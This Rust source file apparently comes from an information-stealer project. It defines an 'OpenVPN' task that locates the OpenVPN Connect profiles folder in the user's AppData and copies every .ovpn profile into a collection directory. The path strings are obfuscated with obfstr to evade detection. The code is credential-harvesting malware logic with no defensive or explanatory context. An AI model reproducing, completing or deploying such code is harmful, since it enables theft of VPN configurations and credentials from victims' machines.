use crate::alloc::borrow::ToOwned;
use tasks::{parent_name, Task};
use utils::path::Path;
use obfstr::obfstr as s;

pub(super) struct OpenVPN;

impl Task for OpenVPN {
    parent_name!("OpenVPN");
    
    unsafe fn run(&self, parent: &Path) {
        let profiles = Path::appdata() / s!("OpenVPN Connect") / s!("profiles");
        
        if !profiles.is_exists() {
            return
        }
        
        profiles.copy_content(parent, &|profile| {
            profile.extension().map(|ex| ex.contains(s!("ovpn"))).unwrap_or(false)
        }).unwrap()
    }
}